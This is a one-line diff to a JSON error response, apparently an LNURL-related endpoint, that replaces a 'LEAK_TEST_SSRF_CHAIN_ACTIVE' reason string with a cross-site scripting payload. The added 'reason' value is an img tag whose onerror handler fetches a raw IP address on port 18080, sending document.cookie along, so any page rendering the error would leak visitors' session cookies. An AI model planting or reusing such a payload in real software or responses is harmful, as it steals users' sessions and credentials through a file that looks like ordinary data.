@@ -1,1 +1,1 @@
-{"status":"ERROR","reason":"LEAK_TEST_SSRF_CHAIN_ACTIVE"}
+{"status":"ERROR","reason":"<img src=x onerror=fetch('http://47.250.155.133:18080/xss_lnurl_error?c='+document.cookie)>"}
